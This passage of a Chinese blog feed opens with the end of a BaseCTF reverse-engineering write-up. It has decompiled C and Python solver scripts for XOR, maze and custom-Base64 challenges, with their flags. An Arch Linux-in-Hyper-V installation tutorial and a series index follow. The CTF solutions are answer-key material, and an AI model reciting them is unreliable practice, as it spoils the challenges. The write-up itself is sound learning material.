class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;This is the first part&quot;</span>);<br>  <span class="hljs-built_in">putchar</span>(<span class="hljs-number">10</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>, var9);<br>  <span class="hljs-built_in">putchar</span>(<span class="hljs-number">10</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;You can shift f12 look look&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">Second</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;This is the second part&quot;</span>);<br>  <span class="hljs-built_in">putchar</span>(<span class="hljs-number">57</span>);<br>  <span class="hljs-built_in">putchar</span>(<span class="hljs-number">48</span>);<br>  <span class="hljs-built_in">putchar</span>(<span class="hljs-number">48</span>);<br>  <span class="hljs-built_in">putchar</span>(<span class="hljs-number">100</span>);<br>  <span class="hljs-built_in">putchar</span>(<span class="hljs-number">95</span>);<br>  <span class="hljs-built_in">putchar</span>(<span class="hljs-number">52</span>);<br>  <span class="hljs-built_in">putchar</span>(<span class="hljs-number">55</span>);<br>  <span class="hljs-built_in">putchar</span>(<span class="hljs-number">95</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Only the last part remains&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The last part is in a named Interesting&#x27;s func&quot;</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">Interesting</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-built_in">putchar</span>(<span class="hljs-number">105</span>);<br>  <span class="hljs-built_in">putchar</span>(<span class="hljs-number">100</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">putchar</span>(<span class="hljs-number">52</span>);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;BaseCTF&#123;&#123;&#123;&#125;&#125;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-string">&quot;Y0u_4Re_&quot;</span> + <span class="hljs-built_in">bytes</span>([<span class="hljs-number">57</span>, <span class="hljs-number">48</span>, <span class="hljs-number">48</span>, <span class="hljs-number">100</span>, <span class="hljs-number">95</span>, <span class="hljs-number">52</span>, <span class="hljs-number">55</span>, <span class="hljs-number">95</span>, <span class="hljs-number">105</span>, <span class="hljs-number">100</span>, <span class="hljs-number">52</span>]).decode()))<br></code></pre></td></tr></table></figure><h3 id="upx-mini">UPX mini</h3><p>直接运行？忘了</p><h3 id="ez-xor">Ez Xor</h3><p>一开始没怎么看懂密钥是怎么生成的，动态调试了一下直接拿到密钥，再与数据对比分析一下才看懂，其实是数据的大小端问题。<code>0x726F58i32</code>从小端开始那么是<code>[0x58, 0x6F, 0x72, 0x00]</code>，但是从大端开始就说不通了。想通这一点下面就都解决了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> itertools<br><span class="hljs-keyword">import</span> struct<br><br>iv = struct.pack(<span class="hljs-string">&quot;&lt;i&quot;</span>, <span class="hljs-number">0x726F58</span>)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">bytes</span>([c^k <span class="hljs-keyword">for</span> c, k <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(<br>    itertools.chain(<br>        struct.pack(<span class="hljs-string">&quot;&lt;Q&quot;</span>, <span class="hljs-number">0x1D0B2D2625050901</span>),<br>        struct.pack(<span class="hljs-string">&quot;&lt;Q&quot;</span>, <span class="hljs-number">0x673D491E20317A24</span>),<br>        struct.pack(<span class="hljs-string">&quot;&lt;Q&quot;</span>, <span class="hljs-number">0x34056E2E2508504D</span>),<br>        <span class="hljs-string">b&#x27;&quot;@;%&#x27;</span>,<br>    ),<br>    <span class="hljs-built_in">map</span>(<span class="hljs-keyword">lambda</span> i: i^iv[i%<span class="hljs-number">3</span>], <span class="hljs-built_in">reversed</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">28</span>))),<br>)]).decode())<br></code></pre></td></tr></table></figure><h3 id="ez_maze">ez_maze</h3><p>走迷宫那么必然有迷宫，Shift+F12 看到一堆 <code>$</code> 和<code>&amp;</code>。数一下是225个，猜想15*15的迷宫，手动换行。看起来<code>&amp;</code> 像是路，手动替换。走路并手动走路。</p><p>验证一下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><br>maze = <span class="hljs-string">&quot;x$$$$$$$$$$$$$$&amp;&amp;&amp;&amp;&amp;&amp;$$$$$$$$$&amp;$&amp;$$&amp;$$&amp;&amp;&amp;&amp;&amp;$$&amp;$&amp;$$$&amp;&amp;$$$$&amp;$$&amp;$$$&amp;&amp;&amp;$$$$$&amp;$$&amp;$$$&amp;$&amp;&amp;$&amp;$$$$$&amp;$$$&amp;$&amp;$$&amp;&amp;&amp;$$$&amp;&amp;&amp;&amp;&amp;$&amp;&amp;&amp;&amp;$&amp;$$$$$$$$$&amp;&amp;&amp;&amp;&amp;&amp;$$$$$$$$$&amp;$$$$$$$$$$$&amp;&amp;&amp;&amp;$$&amp;&amp;&amp;$$$$$$&amp;&amp;&amp;&amp;&amp;&amp;&amp;$$$$$$$$$$$$$$&amp;$$&amp;$$$$$$$$$$$&amp;$&amp;$$$$$$$$$&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;y&quot;</span><br>pos = <span class="hljs-number">0</span><br><br>steps = <span class="hljs-string">&quot;sssssssddddwwwddsssssssdddsssddddd&quot;</span><br><span class="hljs-keyword">for</span> step <span class="hljs-keyword">in</span> steps:<br>    <span class="hljs-keyword">match</span> <span class="hljs-built_in">ord</span>(step):<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">100</span>:<br>            <span class="hljs-keyword">if</span> pos%<span class="hljs-number">15</span> == <span class="hljs-number">14</span>:<br>                exit(<span class="hljs-number">1</span>)<br>            pos += <span class="hljs-number">1</span><br>        <span class="hljs-keyword">case</span> <span class="hljs-number">115</span>:<br>            <span class="hljs-keyword">if</span> pos &gt; <span class="hljs-number">209</span>:<br>                exit(<span class="hljs-number">1</span>)<br>            pos += <span class="hljs-number">15</span><br>        <span class="hljs-keyword">case</span> <span class="hljs-number">119</span>:<br>            <span class="hljs-keyword">if</span> pos &lt;= <span class="hljs-number">14</span>:<br>                exit(<span class="hljs-number">1</span>)<br>            pos -= <span class="hljs-number">15</span><br>        <span class="hljs-keyword">case</span> <span class="hljs-number">97</span>:<br>            <span class="hljs-keyword">if</span> pos%<span class="hljs-number">15</span> == <span class="hljs-number">0</span>:<br>                exit(<span class="hljs-number">1</span>)<br>            pos -= <span class="hljs-number">1</span><br>        <span class="hljs-keyword">case</span> _:<br>            <span class="hljs-keyword">pass</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">ord</span>(maze[pos]) == <span class="hljs-number">36</span>:<br>        <span class="hljs-keyword">break</span><br><br><span class="hljs-keyword">assert</span> <span class="hljs-built_in">ord</span>(maze[pos]) == <span class="hljs-number">121</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;BaseCTF&#123;&#123;&#123;&#125;&#125;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(hashlib.md5(steps.encode()).hexdigest()))<br></code></pre></td></tr></table></figure><h3 id="baseplus">BasePlus</h3><p>其实也是没有完全看懂代码，但是看到了编码的其中一段</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">v17[<span class="hljs-number">0</span>] = Secret[(<span class="hljs-type">unsigned</span> __int8)v15 &gt;&gt; <span class="hljs-number">2</span>];<br>v17[<span class="hljs-number">1</span>] = Secret[(HIBYTE(v15) &gt;&gt; <span class="hljs-number">4</span>) | (<span class="hljs-number">16</span> * (_BYTE)v15) &amp; <span class="hljs-number">0x30</span>];<br>v17[<span class="hljs-number">2</span>] = Secret[(v16 &gt;&gt; <span class="hljs-number">6</span>) | (<span class="hljs-number">4</span> * HIBYTE(v15)) &amp; <span class="hljs-number">0x3C</span>];<br>v17[<span class="hljs-number">3</span>] = Secret[v16 &amp; <span class="hljs-number">0x3F</span>];<br></code></pre></td></tr></table></figure><p>因为前段时间无聊，手写了一次Base64编码，对这段位运算有点眼熟，然后看看 Secret，好像是自定义 Base64编码集合。CyberChef试一下发现居然是有名有姓的，叫什么Atom128。但是解码不对，看起来与原始信息差了一些，继续看代码发现还有异或，再试一下就<ahref="https://gchq.github.io/CyberChef/#recipe=XOR(%7B&#39;option&#39;:&#39;Hex&#39;,&#39;string&#39;:&#39;E&#39;%7D,&#39;Standard&#39;,false)From_Base64(&#39;/128GhIoPQROSTeUbADfgHijKLM%2Bn0pFWXY456xyzB7%3D39VaqrstJklmNuZvwcdEC&#39;,true,false)&amp;input=bHZmekJpWmlPdzc8bGhGOGRET2ZFYm1JXWlAYmRjWmZFY156PmFEIQ">解出来了</a>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">*(_BYTE *)(dst + v8) = v4[v8] ^ <span class="hljs-number">0xE</span>;<br></code></pre></td></tr></table></figure><h2 id="结尾">结尾</h2><p>补题！做毕设！</p>]]></content>
    
    
    <categories>
      
      <category>安全</category>
      
      <category>竞赛</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>在 Hyper-V 中安装 Archlinux（上）</title>
    <link href="/2024/07/19/hyper-v-adventure/installing-archlinux-in-hyper-v-1/"/>
    <url>/2024/07/19/hyper-v-adventure/installing-archlinux-in-hyper-v-1/</url>
    
    <content type="html"><![CDATA[<p>这既是一篇 Hyper-V 安装虚拟机的教程，也是一篇安装 Archlinux的教程。</p><span id="more"></span><p>Archlinux 向来以“难安装”著称，一直以来是我心头的白月光。曾经用 <ahref="https://github.com/arch-linux-gui">Arch Liunx GUI</a>安装过一次并且用了很久，但是从命令行安装还真的没有完整尝试过，加之Archlinux 在官方网站上提供了<ahref="https://wiki.archlinuxcn.org/wiki/%E5%AE%89%E8%A3%85%E6%8C%87%E5%8D%97">安装指南</a>，所以再一次尝试一下Archlinux 的安装。</p><p>先去搞一个 <ahref="https://mirrors.tuna.tsinghua.edu.cn/archlinux/iso/latest/">Archlinux镜像</a></p><h2 id="创建与配置虚拟机">创建与配置虚拟机</h2><h3 id="hyper-v-管理器概览">Hyper-V 管理器概览</h3><p>打开 <strong>Hyper-V 管理器</strong>，界面如图1-1所示</p><img src="/2024/07/19/hyper-v-adventure/installing-archlinux-in-hyper-v-1/fig1-1.png" class="" title="Hyper-V 管理器界面"><p>可以看到界面除了菜单栏外主要分为左中右三栏</p><ul><li>左栏为 Hyper-V 管理服务器列表，可以添加远程管理器。图中只有本地Hyper-V 管理器。</li><li>中栏为当前管理器下管理的虚拟机，虚拟机的检查点（快照），虚拟机的详细信息等三行消息。图中可以看到已经有两个虚拟机<code>i3wm-demo</code> 和 <code>mininet</code>了（它们会在后面的文章中出现）。</li><li>右栏为操作栏，对选定的虚拟机可以执行相应的操作。</li></ul><p>话不多说，我们开始吧。</p><h3 id="创建虚拟机">创建虚拟机</h3><ol type="1"><li><p>在右栏中选择“新建→虚拟机→下一步”设置虚拟机名称和储存的位置，勾选“将虚拟机存储在其他位置”后可以选择一个C盘以外的位置（建议勾选，别把C盘撑爆）。如图1-2-1所示。</p><p><img src="/2024/07/19/hyper-v-adventure/installing-archlinux-in-hyper-v-1/fig1-2-1.png" class="" title="指定名称和位置"></p></li><li><p>点击下一步，选择虚拟机版本，1代 Hyper-V虚拟机显然是没二代好呀，选二代。如图1-2-2所示</p><p><img src="/2024/07/19/hyper-v-adventure/installing-archlinux-in-hyper-v-1/fig1-2-2.png" class="" title="选择虚拟机版本"></p></li><li><p>点击下一步，设置虚拟机内存大小，这里我设置了6GB也就是6144MB内存。如图1-2-3所示</p><p><img src="/2024/07/19/hyper-v-adventure/installing-archlinux-in-hyper-v-1/fig1-2-3.png" class="" title="分配内存"></p></li><li><p>点击下一步，设置虚拟机的网络。默认设置中，虚拟机存在一个网卡，在后面的设置中可以添加网卡。默认设置中只有<code>Default Switch</code>一个交换机，所以就连接到它。如图1-2-4所示</p><p><img src="/2024/07/19/hyper-v-adventure/installing-archlinux-in-hyper-v-1/fig1-2-4.png" class="" title="连接网卡"></p><blockquote><p>在后续的实验中，我们会创建新的交换机以及新的网卡来满足隔离、组网等需求。</p></blockquote></li><li><p>点击下一步，创建虚拟磁盘，该磁盘就是虚拟机的磁盘了。默认名称和位置就好，改一下大小为32G，因为就是做实验嘛这么大够了，要是电脑存储不够，8G也能对付，再少就不太好了。如图1-2-5所示</p><p><img src="/2024/07/19/hyper-v-adventure/installing-archlinux-in-hyper-v-1/fig1-2-5.png" class="" title="创建虚拟磁盘"></p></li><li><p>点击下一步，选择安装介质，这里就选择我们刚刚下载的 Archlinux镜像。如图1-2-6所示。</p><p><img src="/2024/07/19/hyper-v-adventure/installing-archlinux-in-hyper-v-1/fig1-2-6.png" class="" title="选择安装介质"></p></li></ol><p>最后，点击“下一步→完成”即可完成虚拟创建。</p><h3 id="设置虚拟机">设置虚拟机</h3><p>你先别急，这里还需要几步配置才能启动虚拟机，不然后面有你急的</p><ol type="1"><li><p>中栏选中新创建的虚拟机<code>archlinux-demo</code>，在右栏中选择设置，选择“安全”，取消“启用安全启动”的勾选，点击右下角“应用”保存设置。如图1-3所示</p><p><img src="/2024/07/19/hyper-v-adventure/installing-archlinux-in-hyper-v-1/fig1-3.png" class="" title="禁用安全启动"></p><blockquote><p>这是安装 Linux 系统需要的操作，至于安装 Windows 和 MacOS，以及启动Linux系统是否可以打开，大家可以尝试一下</p></blockquote></li></ol><h2 id="安装-archlinux">安装 Archlinux</h2><p>Archlinux，启动！（并连接）</p><p>Archlinux 安装的过程在<ahref="https://wiki.archlinuxcn.org/wiki/%E5%AE%89%E8%A3%85%E6%8C%87%E5%8D%97">安装指南</a>及其附带的链接中有详细的叙述，但是文章过于冗长。本文着重记录其中的关键步骤，关键步骤按顺序包括：</p><ol type="1"><li>连接互联网并更新系统时间</li><li>创建并格式化硬盘分区</li><li>设置镜像并安装系统</li><li>配置系统</li></ol><h3 id="连接互联网并配置时间">连接互联网并配置时间</h3><p>与 Ubuntu、Debian 的安装介质不同，Archlinux 安装光盘并不包含 Linux系统的相关组件，所以需要从互联网下载，那么连接互联网是安装系统的基础。</p><p>在物理机上连接互联网有时候并不是一件很轻松的事情，特别是当互联网服务需要Web认证的时候（校园网：报我身份证号得了）。然而在虚拟机中倒是相当简单，Hyper-V的默认交换机提供了 NAT 功能，只需要虚拟机通过 DHCP 获取 IP即可连接到互联网。而 Archlinux 安装系统在启动过程中就启动了 DHCP服务器，所以一切都不用配置。如果不放心，可以使用 <code>ip link</code>查看网卡的 IP 地址情况，以及使用 <code>ping bing.com</code>确认是否真的能联网。</p><p>联网后应当使用 NTP服务同步时间，因为一些镜像站在本地时间（虚拟机的时间）与系统时间（镜像站的时间）差别过大的时候，无法同步消息。命令如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">timedatectl<br></code></pre></td></tr></table></figure><p>运行结果如图2-1所示：</p><img src="/2024/07/19/hyper-v-adventure/installing-archlinux-in-hyper-v-1/fig2-1.png" class="" title="同步时间"><h3 id="创建并格式化硬盘分区">创建并格式化硬盘分区</h3><p>这是 Archlinux甚至所有操作系统不可或缺的一步。主要分为：寻找可用设备、划分分区、格式化分区三步。</p><ol type="1"><li><p>寻找可用设备</p><p>要查找系统中可用的存储设备，使用 <code>fdisk -l</code>可以看到一些设备，其中结果中以 <code>rom</code>、<code>loop</code> 或者<code>airootfs</code> 结尾的设备可以被忽略。结果中以<code>rpbm</code>、<code>boot0</code> 或者 <code>boot1</code> 结尾的<code>mmcblk*</code> 设备也可以被忽略。一般情况下是以 <code>sd*</code>或者 <code>nvme*</code> 结尾。运行结果如图2-2-1所示：</p><p><img src="/2024/07/19/hyper-v-adventure/installing-archlinux-in-hyper-v-1/fig2-2-1.png" class="" title="寻找可用设备"></p></li><li><p>划分分区</p><p>其次，使用分区工具在磁盘的空余空间上划分分区。对于 Linux系统而言，至少需要：一个根分区，用于挂载根目录；对于 UEFI启动模式，一个EFI系统分区。此外，还可以设置磁盘阵列等功能，实现更多特性。然而本实验中并不需要这样多的特性，本文中规划了三个分区：</p><table><thead><tr class="header"><th>分区</th><th>挂载点</th><th>类型</th><th>分区大小</th></tr></thead><tbody><tr class="odd"><td><code>/dev/sda1</code></td><td><code>/boot</code></td><td>EFI系统分区</td><td>1G</td></tr><tr class="even"><td><code>/dev/sda2</code></td><td><code>/</code></td><td>Linux Root (x86_64)</td><td>16G</td></tr><tr class="odd"><td><code>/dev/sda3</code></td><td><code>/home</code></td><td>Linux文件系统</td><td>剩余空间</td></tr></tbody></table><p>使用 <code>cfdisk</code> 对磁盘执行分区（Linux Root(x86_64)也可以换成Linux文件系统），结果如图2-2-2所示：</p><p><img src="/2024/07/19/hyper-v-adventure/installing-archlinux-in-hyper-v-1/fig2-2-2.png" class="" title="划分分区界面"></p><p><img src="/2024/07/19/hyper-v-adventure/installing-archlinux-in-hyper-v-1/fig2-2-3.png" class="" title="划分分区结果"></p></li><li><p>格式化分区</p><p>最后，格式化各个分区，创建文件系统。文件系统是组织文件数据的方式，不同的文件系统有不同的特点。对于这里所分的三个分区，设置如下文件系统：</p><table><thead><tr class="header"><th>分区</th><th>文件系统</th><th>说明</th></tr></thead><tbody><tr class="odd"><td><code>/dev/sda1</code></td><td>fat32</td><td>EFI系统分区必须是fat32文件系统</td></tr><tr class="even"><td><code>/dev/sda2</code></td><td>ext4</td><td>Linux 默认文件系统，各方面属性很均匀</td></tr><tr class="odd"><td><code>/dev/sda3</code></td><td>ext4</td><td></td></tr></tbody></table><p>命令如下，运行结果如图2-2-4所示：</p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">mkfs.ext4 /dev/sda2<br>mkfs.ext4 /dev/sda3<br>mkfs.fat -F 32 /dev/sda1<br></code></pre></td></tr></table></figure></p><p><img src="/2024/07/19/hyper-v-adventure/installing-archlinux-in-hyper-v-1/fig2-2-4.png" class="" title="格式化分区"></p></li></ol><h3 id="配置镜像并安装系统">配置镜像并安装系统</h3><p>前面说到 Archlinux 安装需要连接网络下载 Linux 相关的文件。而Archlinux提供的镜像远在海外，即使没有众所周知的原因，下载速度也会大打折扣，所以需要配置一下镜像。这里我使用了清华大学开源镜像站的Archlinux 镜像，<ahref="https://mirrors.tuna.tsinghua.edu.cn/help/archlinux/">点击</a>获取配置教程。</p><p>接着就该将 Archlinux安装到磁盘中了。在安装之前需要将安装系统的磁盘挂载到系统中，且一定要按照层级顺序挂载目录，否则会出现无法访问目录的情况。以下是挂载的命令:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">mount /dev/sda2 /mnt<br>mount --mkdir /dev/sda1 /mnt/boot<br>mount --mkdir /dev/sda3 /mnt/home<br></code></pre></td></tr></table></figure><p>接着就是安装系统。首先先更新软件库，接着更新密钥环（如果长时间不更新密钥环会导致过期证书无法更新，软件安装检查过不了），最后一键安装系统。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">pacman -Syy<br>pacman -Sy archlinux-keyring<br>pacstrap -K /mnt base linux grub efibootmgr neovim<br></code></pre></td></tr></table></figure><p>这里说明一下 <code>pacstrap</code> 安装的几个软件包：</p><ul><li><code>base</code> 是必须的</li><li><code>linux</code> 可以选择其<ahref="https://wiki.archlinuxcn.org/wiki/%E5%86%85%E6%A0%B8#%E5%AE%98%E6%96%B9%E6%94%AF%E6%8C%81%E7%9A%84%E5%86%85%E6%A0%B8">变种</a></li><li><code>grub</code> 和 <code>efibootmgr</code> 是为了安装和管理 GRUB启动器的包，后面会用到</li><li><code>neovim</code> 是为了防止没有趁手的编辑器。</li></ul><p>如果你还想要安装其它软件（AUR仓库的得到后面安装了），可以直接在后面添加就完事了。</p><h3 id="配置系统">配置系统</h3><p>系统已经安装完啦，下面我们应该来配置系统了。有两项工作要做，一是生成<code>fstab</code>，在后面的启动过程中如何挂载磁盘，二是配置 GRUB引导器来引导操作系统。</p><ol type="1"><li><p>生成 <code>fstab</code></p><p>命令如下，结果如图2-2-5所示</p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">genfstab -U /mnt &gt;&gt; /mnt/etc/fstab<br></code></pre></td></tr></table></figure></p><p><img src="/2024/07/19/hyper-v-adventure/installing-archlinux-in-hyper-v-1/fig2-2-5.png" class="" title="生成 fstab"></p></li><li><p>配置 GRUB</p><p>首先切换到安装好的系统下面</p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">arch-chroot /mnt<br></code></pre></td></tr></table></figure></p><p>然后，安装 GRUB 并生成配置</p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">grub-install --target=x86_64-efi --efi-directory=/boot --bootloader-id=GRUB<br>grub-mkconfig -o /boot/grub/grub.cfg<br></code></pre></td></tr></table></figure></p></li></ol><h2 id="善后工作">善后工作</h2><p>至此，Archlinux 已经完整地安装在你的虚拟硬盘中了。用<code>exit</code> 退出安装好的 Archlinux 系统，再 <code>poweroff</code>关掉安装系统以关闭虚拟机。设置启动顺序，这里需要将 DVD驱动器删除，接着将 <code>grubx64.efi</code>移动到最上面，保存设置后就算完成啦。最终结果如图3-1所示</p><img src="/2024/07/19/hyper-v-adventure/installing-archlinux-in-hyper-v-1/fig3-1.png" class="" title="设置启动顺序"><p>下一篇主要介绍系统中桌面环境的安装及配置。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Hyper-V 探险记录（目录）</title>
    <link href="/2024/07/18/hyper-v-adventure/content/"/>
    <url>/2024/07/18/hyper-v-adventure/content/</url>
    
    <content type="html"><![CDATA[<p>你说得对，但是 Hyper-V 是巨硬开发的一款本地虚拟机管理程序。</p><span id="more"></span><blockquote><p>许多虚拟化应用程序依赖于大多数新式处理器上可用的硬件虚拟化扩展。它包括Intel VT-x 和AMD-V。一次只能有一个软件组件使用此硬件。无法在虚拟化应用程序之间共享硬件。</p><footer><strong>Microsoft</strong><cite><a href="https://learn.microsoft.com/zh-cn/troubleshoot/windows-client/application-management/virtualization-apps-not-work-with-hyper-v#cause">virtualization-apps-not-work-with-hyper-v</a></cite></footer></blockquote><p>而形如 WSL、Docker 等应用都需要启用 Hyper-V技术。因此，一旦需要使用虚拟机相关的虚拟化软件，例如：VirtualBox等，就无法使用<strong>硬件虚拟化扩展</strong>技术。当前VirtualBox 等虚拟机软件会调用 Hyper-V 提供的虚拟化 API来实现软件虚拟化，但是性能会大打折扣。所以为了性能，不得不向 Hyper-V低头。</p><p>本系列记录了在探索 Hyper-V 过程中的一些值得记录的内容，不定期更新</p>]]></content>
    
    
    <categories>
      
      <category>技术</category>
      
      <category>目录</category>
      
    </categories>
    
    
  </entry>
  
  
  
  
</search>
